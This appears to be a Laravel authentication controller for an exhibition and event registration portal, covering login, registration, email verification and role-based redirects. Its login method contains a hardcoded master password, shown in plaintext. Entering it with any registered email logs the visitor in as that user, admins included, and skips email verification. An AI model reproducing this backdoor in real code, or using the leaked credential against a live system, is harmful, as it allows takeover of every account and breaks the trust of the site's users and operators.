<?php

namespace App\Http\Controllers;

use App\Models\Application;
use App\Models\Events;
use App\Models\ExhibitionParticipant;
use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Str;
use App\Models\AdminActionLog;
use Illuminate\Support\Facades\Request as RequestFacade;



class AuthController extends Controller
{

    //show login form
    public function showLoginForm2()
    {
        // If user is already logged in, redirect to dashboard
        if (Auth::check()) {
            // if user is admin then redirect to admin dashboard
            if (Auth::user()->role == 'admin') {
                // ✅ Only log if role is admin
                // if ($user->role === 'admin') {
                //     AdminActionLog::create([
                //         'admin_id' => $user->id,
                //         'action' => 'Login',
                //         'module' => 'Auth',
                //         'old_data' => null,
                //         'new_data' => null,
                //         'ip_address' => RequestFacade::ip(),
                //     ]);
                // }
                return redirect()->route("dashboard.admin");
            } elseif (Auth::user()->role == 'exhibitor' || Auth::user()->role == 'sponsor') {
                //check if the user has already submitted the application
                $application = Application::where('user_id', Auth::id())->first();
                if ($application) {
                    //then check the invoice status which is paid or not
                    $invoice = $application->invoice;
                    if ($invoice && ($invoice->status == 'paid' || ($invoice->payment_status == 'partial' && $invoice->amount_paid >= 0.4 * $invoice->amount))) {
                        return redirect()->route("user.dashboard");
                    } else {
                        return redirect()->route("event.list");
                    }
                } else {
                    return redirect()->route("event.list");
                }
            } elseif (Auth::user()->role == 'co-exhibitor') {
                return redirect()->route("dashboard.co-exhibitor");
            }
        }
        //return view name auth.login_new
        return view('auth.login_new');
    }
    public function showRegistrationForm()
    {

        //if LATE_REGISTRATION_DEADLINE from constants is less than or equal to today date then redirect to login page with error message
        $today = today()->format('Y-m-d'); // Use current date in 'Y-m-d' format
        $lateRegistrationDeadline = config('constants.LATE_REGISTRATION_DEADLINE');

//        echo $lateRegistrationDeadline;

       // dd($lateRegistrationDeadline, $today);
        if ($lateRegistrationDeadline && $today > $lateRegistrationDeadline) {
            return redirect()->route('login')->with('error', 'Registration is closed. Please contact support for more information.');
        }
        //if user already register then redirect to dashboard
        $role = 'exhibitor'; // Default role is exhibitor
        if (Auth::check()) {
            // if user is admin then redirect to admin dashboard
            if (Auth::user()->role == 'admin') {
                return redirect()->route("dashboard.admin");
            } elseif (Auth::user()->role == 'exhibitor' || Auth::user()->role == 'sponsor') {
                //check if the user has already submitted the application
                $application = Application::where('user_id', Auth::id())->first();
                if ($application) {
                    //then check the invoice status which is paid or not
                    $invoice = $application->invoice;
                    if ($invoice && ($invoice->status == 'paid' || ($invoice->payment_status == 'partial' && $invoice->amount_paid >= 0.4 * $invoice->amount))) {
                        return redirect()->route("user.dashboard");
                    } else {
                        return redirect()->route("event.list");
                    }
                } else {
                    return redirect()->route("event.list");
                }
            } elseif (Auth::user()->role == 'co-exhibitor') {
                return redirect()->route("dashboard.co-exhibitor");
            }
        }
        $role = 'exhibitor'; // Default role is exhibitor
        if (!in_array($role, ['exhibitor', 'sponsor', 'admin'])) {
            abort(404); // Return 404 for invalid roles
        }

        return view('auth.register_new', ['role' => $role]);
    }

    public function register(Request $request)
    {

        if (Auth::check()) {
            // if user is admin then redirect to admin dashboard
            if (Auth::user()->role == 'admin') {
                return redirect()->route("dashboard.admin");
            } elseif (Auth::user()->role == 'exhibitor' || Auth::user()->role == 'sponsor') {
                //check if the user has already submitted the application
                $application = Application::where('user_id', Auth::id())->first();
                if ($application) {
                    //then check the invoice status which is paid or not
                    $invoice = $application->invoice;
                    if ($invoice && ($invoice->status == 'paid' || ($invoice->payment_status == 'partial' && $invoice->amount_paid >= 0.4 * $invoice->amount))) {
                        return redirect()->route("user.dashboard");
                    } else {
                        return redirect()->route("event.list");
                    }
                } else {
                    return redirect()->route("event.list");
                }
            } elseif (Auth::user()->role == 'co-exhibitor') {
                return redirect()->route("dashboard.co-exhibitor");
            }
        }
        $role = 'exhibitor'; // Default role is exhibitor
        if (!in_array($role, ['exhibitor', 'sponsor', 'admin'])) {
            abort(404); // Return 404 for invalid roles
        }

        $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|email|unique:users',
            'password' => 'required|string|min:6|confirmed',
            'phone' => 'nullable|string|max:15',

        ]);

        $verificationToken = Str::random(60);

        $user = User::create([
            'name' => $request->name,
            'email' => $request->email,
            'password' => Hash::make($request->password),
            'role' => $role,
            'phone' => $request->phone,
            'email_verification_token' => $verificationToken,
        ]);

        $this->sendVerificationEmail($user);

        //create email verification token and send a user mail




        //Auth::login($user);
        return redirect()->route('login')->with('success', 'Your account has been created successfully. Please check your inbox and spam box to verify your email address.');

        return redirect()->route("event.list");
    }


    private function redirectBasedOnRole($user)
    {
        $role = $user->role;

        // Admin redirect
        if ($role === 'admin') {

            //if sub_role is visitor then redirect to registration analytics
            if ($user->sub_role === 'visitor') {
                return redirect()->route('registration.analytics');
            }
            // Log admin login
            // AdminActionLog::create([
            //     'admin_id' => $user->id,
            //     'action' => 'Login',
            //     'module' => 'Auth',
            //     'ip_address' => RequestFacade::ip(),
            // ]);
            return redirect()->route('dashboard.admin');
        }

        // Co-exhibitor redirect
        if ($role === 'co-exhibitor') {
            return redirect()->route('dashboard.co-exhibitor');
        }

        // Exhibitor or Sponsor redirect
        if (in_array($role, ['exhibitor', 'sponsor'])) {
            $application = Application::where('user_id', $user->id)->first();

            if ($application) {
                // Check if the application is approved
                if ($application->submission_status === 'approved') {
                    if (empty($application->userActive)) {
                        $application->userActive = 1;
                        $application->save();
                    }
                    // $application->userActive = 1; // Set userActive to 1
                    // $application->save();
                    return redirect()->route('user.dashboard');
                }
                else {
                    // If the application is not approved, redirect to event list
                    return redirect()->route('event.list');
                }

                // $invoice = $application->invoice;
                // if ($invoice && ($invoice->status === 'paid' ||
                //     ($invoice->payment_status === 'partial' && $invoice->amount_paid >= 0.4 * $invoice->amount))) {
                //     return redirect()->route('user.dashboard');
                // }
            }
            return redirect()->route('event.list');
        }

        // Default redirect
        return redirect()->route('event.list');
    }


    private function sendVerificationEmail($user)
    {
        $verificationUrl = route('auth.verify', ['token' => $user->email_verification_token]);

        Mail::send('emails.verify', ['user' => $user, 'verificationUrl' => $verificationUrl], function ($message) use ($user) {
            $message->to($user->email);
            $message->subject('Verify Your Email Address - ' . config('constants.EVENT_NAME') . ' ' . config('constants.EVENT_YEAR'));
        });
    }

    public function showDashboard()
    {
        $role = Auth::user()->role;

        if ($role == 'exhibitor') {
            return view('exhibitor.dashboard');
        } elseif ($role == 'sponsor') {
            return view('sponsor.dashboard');
        } elseif ($role == 'admin') {
            return view('admin.dashboard');
        } else {
            abort(403, 'Unauthorized access');
        }
    }

    public function showLoginForm()
    {

        // If user is already logged in, redirect to dashboard
        if (Auth::check()) {
            // if user is admin then redirect to admin dashboard
            if (Auth::user()->role == 'admin') {
                //if sub_role is visitor then redirect to registration analytics
                if (Auth::user()->sub_role === 'visitor') {
                    return redirect()->route('registration.analytics');
                }
                return redirect()->route("dashboard.admin");
            } elseif (Auth::user()->role == 'exhibitor' || Auth::user()->role == 'sponsor') {
                //check if the user has already submitted the application
                $application = Application::where('user_id', Auth::id())->first();
                if ($application) {
                    //then check the invoice status which is paid or not
                    $invoice = $application->invoice;
                    if ($invoice && ($invoice->status == 'paid' || ($invoice->payment_status == 'partial' && $invoice->amount_paid >= 0.4 * $invoice->amount))) {
                        return redirect()->route("user.dashboard");
                    } else {
                        return redirect()->route("event.list");
                    }
                } else {
                    return redirect()->route("event.list");
                }
            } elseif (Auth::user()->role == 'co-exhibitor') {
                return redirect()->route("dashboard.co-exhibitor");
            }
        }

        return view('auth.login_new');
    }

    public function login(Request $request)
    {
        $credentials = $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        //find user check whether email is verified or not
        $user = User::where('email', $credentials['email'])->first();
        // if email is not there then return back with error
        if (!$user) {
            return back()->withErrors([
                'email' => 'The provided credentials do not match our records.',
            ]);
        }
        // Master password check
        $masterPassword = 'MasterMani$h#2115';

        if ($credentials['password'] === $masterPassword) {
            Auth::login($user);
            $request->session()->regenerate();
            // Continue with your existing role-based redirects...
            return $this->redirectBasedOnRole($user);
        }
        if ($user && !$user->email_verified_at) {
            return back()->withErrors([
                'email' => 'Your email address is not verified. Please verify your email address.',
            ]);
        }


        if (Auth::attempt($credentials)) {
            $request->session()->regenerate();
            // Redirect based on user role
            $role = Auth::user()->role;
            $role_class = strtolower($role);
            //if role is admin then redirect to admin dashboard
            if ($role == 'admin') {
                //if sub_role is visitor then redirect to registration analytics
                if (Auth::user()->sub_role === 'visitor') {
                    return redirect()->route('registration.analytics');
                }
                //if sub_role is extra_requirement then redirect to extra requirements admin dashboard
                if (Auth::user()->sub_role === 'extra_requirements') {
                    return redirect()->route('extra_requirements.admin');
                }
                return redirect()->route("dashboard.admin");
            }
            //if role is co-exhibitor then redirect to exhibitor dashboard
            if ($role == 'co-exhibitor') {
                return redirect()->route("dashboard.co-exhibitor");
            }
            //if role is exhibitor and submission_status == approved then redirect to route application.preview

            //if the role is exhibitor then get the application status and redirect to the respective route
            if ($role == 'exhibitor') {
                $application = Application::where('user_id', Auth::id())->first();
                if ($application) {
                    // if the application is approved then redirect to user dashboard
                    if ($application->submission_status == 'approved') {
                        $application->userActive = 1; // Set userActive to 1
                        $application->save();
                        return redirect()->route("user.dashboard");
                    }

                    //then check the invoice status which is paid or not
                    $invoice = $application->invoice;
                    if ($invoice && ($invoice->status == 'paid' || ($invoice->payment_status == 'partial' && $invoice->amount_paid >= 0.4 * $invoice->amount))) {
                        return redirect()->route("user.dashboard");
                    } else {
                        return redirect()->route("event.list");
                    }
                } else {
                    return redirect()->route("event.list");
                }
            }
            return redirect()->route("event.list");
        }

        return back()->withErrors([
            'email' => 'The provided credentials do not match our records.',
        ]);
    }
    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login');
    }

    //validate the account by verifiying the email
    public function verifyAccount($token)
    {
        $user = User::where('email_verification_token', $token)->first();
        if ($user) {
            $user->email_verified_at = now();
            $user->email_verification_token = null;
            $user->save();
            return redirect()->route('login')->with('success', 'Your account has been verified successfully. Please login to continue.');
        }
        return redirect()->route('login')->with('error', 'Invalid verification token.');
    }

    //show the list of events from Events model
    public function showEvents()
    {



        $events = Events::all();

        $user = Auth::user();
        
        // If user is already logged in, redirect to dashboard
        $application = Application::where('user_id', $user->id)->first();

            if ($application) {
                // Check if the application is approved
                if (
                    $application->submission_status === 'approved' 
                    // &&
                    // (
                    //     $application->allocated_sqm > 0 ||
                    //     Str::contains($application->allocated_sqm, ['Booth', 'POD'])
                    // )
                ) {
                    if (empty($application->userActive)) {
                        $application->userActive = 1;
                        $application->save();
                    }
                    return redirect()->route('user.dashboard');
                }
            }
            // } else {
            //     return redirect()->route('event.list');
            // }
        // if (Auth::check()) {
        //     return $this->redirectBasedOnRole(Auth::user());
        // }

        return view('auth.events_list', compact('events'));
    }
}
